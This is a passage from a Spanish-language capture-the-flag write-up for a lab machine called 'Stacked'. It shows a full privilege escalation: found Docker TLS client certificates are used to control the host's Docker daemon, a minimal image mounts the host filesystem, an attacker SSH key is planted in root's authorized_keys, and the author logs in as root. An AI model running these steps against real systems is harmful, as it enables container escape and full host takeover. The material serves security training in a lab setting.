/opt/code/localstack/localstack/node_modules/kinesalite/ssl/ca-key.pem
/opt/code/localstack/localstack/node_modules/kinesalite/ssl/ca-crt.pem
/opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-csr.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert.passwd.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/dh512.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert2.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/badcert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/https_svn_python_org_root.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_cert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nullbytecert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/badkey.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nokia.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_key.passwd.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nullcert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/sha256.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_key.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/websocket/cacert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/pyftpdlib/test/keycert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/pip/_vendor/certifi/cacert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/certifi/cacert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_x509.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes128.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_p8.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_des3.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_p8_clear.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_public.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes192.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes256_gcm.pem  
/opt/code/localstack/.venv/lib/python3.8/site-packages/botocore/cacert.pem
/root/.local/share/virtualenv/wheel/3.8/image/1/CopyPipInstall/pip-20.3.1-py2.py3-none-any/pip/_vendor/certifi/cacert.pem
/root/.docker/key.pem
/root/.docker/ca-key.pem
/root/.docker/ca.pem
/root/.docker/cert.pem
</code></pre></div><p>Los certificados en <code>/root/.docker</code> son los correctos. Podemos echar un vistazo a la <a href=https://docs.docker.com/engine/security/protect-access/>documentación de Docker</a> para saber cómo interactuar con un Docker en remoto usando certificados. Podemos decirle que nos muestre su versión:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0# docker --tlsverify --tlscacert ca.pem --tlscert cert.pem --tlskey key.pem -H 172.17.0.1:2376 version  
Client:
 Version:      17.05.0-ce
 API version:  1.29
 Go version:   go1.7.5
 Git commit:   89658be
 Built:        Fri May  5 15:36:11 2017
 OS/Arch:      linux/amd64

Server:
 Version:      20.10.8
 API version:  1.41 (minimum version 1.12)
 Go version:   go1.16.6
 Git commit:   75249d8
 Built:        Fri Jul 30 19:52:16 2021
 OS/Arch:      linux/amd64
 Experimental: false
</code></pre></div><p>Perfecto, ha funcionado. Como resultado, podemos usar Docker como si estuvieramos en la máquina anfitrión (<em>host</em>).</p><p>Nótese que <code>172.17.0.1</code> es la dirección IP de la interfaz <code>docker0</code> de la máquina.</p><p>Por comodidad, podemos configurar un alias (<code>mydocker</code>) al comando largo de <code>docker</code> como se muestra:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0# alias mydocker='docker --tlsverify --tlscacert ca.pem --tlscert cert.pem --tlskey key.pem -H 172.17.0.1:2376'  
</code></pre></div><p>Usando este alias, ahora podemos listar los contenedores en ejecución:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0# mydocker container ls
CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                                                                                                  NAMES
910b69680838        localstack/localstack-full:0.12.6   "docker-entrypoint.sh"   20 hours ago        Up 20 hours         127.0.0.1:443-&gt;443/tcp, 127.0.0.1:4566-&gt;4566/tcp, 127.0.0.1:4571-&gt;4571/tcp, 127.0.0.1:8080-&gt;8080/tcp   localstack_main  
</code></pre></div><p>Muestra solo una instancia de LocalStack. Y tenemos estas imágenes disponibles:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0# mydocker images
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
localstack/localstack-full   0.12.6              7085b5de9f7c        7 months ago        888MB
localstack/localstack-full   &lt;none&gt;              0601ea177088        13 months ago       882MB  
lambci/lambda                nodejs12.x          22a4ada8399c        13 months ago       390MB
lambci/lambda                nodejs10.x          db93be728e7b        13 months ago       385MB
lambci/lambda                nodejs8.10          5754fee26e6e        13 months ago       813MB
</code></pre></div><p>La idea aquí es ejecutar otro contenedor y montar el sistema de archivos de la máquina en el contenedor, de manera que podamos escribir una clave pública de SSH en <code>/root/.ssh/authorized_keys</code> y conectarnos como <code>root</code> por SSH.</p><p>Podemos crear un par de claves usando <code>ssh-keygen</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh-keygen</span>
Generating public/private rsa key pair.
Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:3Nb1eAyClnfVUIvPYp270LB/EspMAcanzxZzNG62UUQ
The key's randomart image is:
+---[RSA 3072]----+
|         .    .=E|
|          +o. +.+|
|         .++o+++ |
|       . o.o++X=.|
|        S oo.@.B+|
|         .  * B..|
|           = + + |
|            + + o|
|               +.|
+----[SHA256]-----+

<span class=code-cyan>$</span> <span class=code-dark-green>cat</span> id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/N  
M5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=
</code></pre></div><p>Para ejecutar un contenedor de Docker, necesitamos especificar una imagen. Podemos utilizar cualquiera de las de <code>lambci/lambda</code>, pero entraremos como usuario no privilegiado, por lo que no podremos acceder a los archivos de <code>root</code> en la máquina. Si usamos la imagen de <code>localstack/localstack:0.12.6</code> tendremos errores debido a volúmenes existentes.</p><p>Por tanto, tenemos que encontrar una manera de crear una imagen de Docker personalizada. Como la máquina no tiene conexión a Internet, tenemos que utilizar una imagen existente como base. Existe una imagen especial en Docker que se llama <a href=https://hub.docker.com/_/scratch/><code>scratch</code></a> y que es solamente un contenedor vacío.</p><p>Para crear una imagen desde <a href=https://hub.docker.com/_/scratch/><code>scratch</code></a>, tenemos que copiar algunos binarios. Y para que los binarios funcionen, necesitamos copiar algunas librerías compartidas (por ejemplo, Glibc).</p><p>Copiaremos los binarios <code>/bin/sh</code>, <code>/bin/cat</code> y <code>/bin/echo</code> para poder tener una <em>shell</em> y realizar operaciones de lectura y escritura. Estos binarios utilizan la misma librería compartida:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0# ldd /bin/sh
        /lib/ld-musl-x86_64.so.1 (0x7f43b9444000)
        libc.musl-x86_64.so.1 =&gt; /lib/ld-musl-x86_64.so.1 (0x7f43b9444000)  
bash-5.0# ldd /bin/cat
        /lib/ld-musl-x86_64.so.1 (0x7f55e6a2c000)
        libc.musl-x86_64.so.1 =&gt; /lib/ld-musl-x86_64.so.1 (0x7f55e6a2c000)
bash-5.0# ldd /bin/echo
        /lib/ld-musl-x86_64.so.1 (0x7f691e268000)
        libc.musl-x86_64.so.1 =&gt; /lib/ld-musl-x86_64.so.1 (0x7f691e268000)
</code></pre></div><p>Por tanto, el <code>Dockerfile</code> necesario para crear la imagen es este:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>FROM</span> <span class=mtk1>scratch</span>

<span class=mtk5>WORKDIR</span> <span class=mtk1>/bin</span>
<span class=mtk5>COPY</span> <span class=mtk1>sh</span> <span class=mtk1>.</span>
<span class=mtk5>COPY</span> <span class=mtk1>cat</span> <span class=mtk1>.</span>
<span class=mtk5>COPY</span> <span class=mtk1>echo</span> <span class=mtk1>.</span>

<span class=mtk5>WORKDIR</span> <span class=mtk1>/lib</span>
<span class=mtk5>COPY</span> <span class=mtk1>ld-musl-x86_64.so.1</span> <span class=mtk1>.</span>  
</code></pre></div><p>Copiaremos estos archivos en el directorio de trabajo actual y contruiremos la imagen desde aquí también. La imagen se llama <code>pwn</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0# echo -e 'FROM scratch\nWORKDIR /bin\nCOPY sh .\nCOPY cat .\nCOPY echo .\nWORKDIR /lib\nCOPY ld-musl-x86_64.so.1 .' &gt; Dockerfile  
bash-5.0# cp /bin/sh .
bash-5.0# cp /bin/cat .
bash-5.0# cp /bin/echo .
bash-5.0# cp /lib/ld-musl-x86_64.so.1 .
bash-5.0# mydocker build -t pwn .
Sending build context to Docker daemon  3.882MB
Step 1/7 : FROM scratch
 ---&gt;
Step 2/7 : WORKDIR /bin
 ---&gt; Running in 59c11f6289e3
Removing intermediate container 59c11f6289e3
 ---&gt; 2d5ecb48eafb
Step 3/7 : COPY sh .
 ---&gt; 5d2277fa1fb4
Step 4/7 : COPY cat .
 ---&gt; 52a4554cb022
Step 5/7 : COPY echo .
 ---&gt; 11c3ea334ad7
Step 6/7 : WORKDIR /lib
 ---&gt; Running in d7554e33572d
Removing intermediate container d7554e33572d
 ---&gt; d9142f99a2e0
Step 7/7 : COPY ld-musl-x86_64.so.1 .
 ---&gt; 6f7cf378f889
Successfully built 6f7cf378f889
Successfully tagged pwn:latest
</code></pre></div><p>Podemos verificar que se ha creado bien:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0# mydocker images
REPOSITORY                   TAG                 IMAGE ID            CREATED              SIZE
pwn                          latest              6f7cf378f889        About a minute ago   2.28MB
localstack/localstack-full   0.12.6              7085b5de9f7c        7 months ago         888MB
localstack/localstack-full   &lt;none&gt;              0601ea177088        13 months ago        882MB  
lambci/lambda                nodejs12.x          22a4ada8399c        13 months ago        390MB
lambci/lambda                nodejs10.x          db93be728e7b        13 months ago        385MB
lambci/lambda                nodejs8.10          5754fee26e6e        13 months ago        813MB
</code></pre></div><p>Y entonces podemos ejecutar el contenedor utilizando esta imagen y especificando que <code>/</code> en la máquina anfitrión se monte en <code>/mnt</code> en el contenedor:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>bash-5.0# mydocker run --rm -v /:/mnt -it pwn /bin/sh  
/lib # cat /mnt/etc/hostname
stacked
</code></pre></div><p>Y como se puede ver, <code>/mnt/etc/hostname</code> muestra <code>stacked</code>, por lo que estamos leyendo archivos de la máquina anfitrión. Entonces, vamos a añadir la clabe pública de SSH en <code>/mnt/root/.ssh/authorized_keys</code> (que es <code>/root/.ssh/authorized_keys</code> en el sistema de archivos de la máquina anfitrión):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>/lib # echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/NM5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=' &gt; /mnt/root/.ssh/authorized_keys  
/lib # cat /mnt/root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/NM5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=
</code></pre></div><p>Finalmente, podemos acceder como <code>root</code> en la máquina mediante SSH:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> -i id_rsa root@10.10.11.112  
root@stacked:~# cat root.txt
bd97095c84e01bc86ec04f08be824f38
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#comprometiendo-localstack-_proxy_-mitm>Comprometiendo LocalStack. <em>Proxy</em> MITM</a></li><li><a href=#comprometiendo-localstack-rce>Comprometiendo LocalStack. RCE</a></li><li><a href=#encontrando-un-xss>Encontrando un XSS</a></li><li><a href=#intrusión-en-el-contenedor>Intrusión en el contenedor</a></li><li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li><li><a href=#escalada-de-privilegios-en-el-contenedor>Escalada de privilegios en el contenedor</a></li><li><a href=#escalada-de-privilegios-en-la-máquina>Escalada de privilegios en la máquina</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>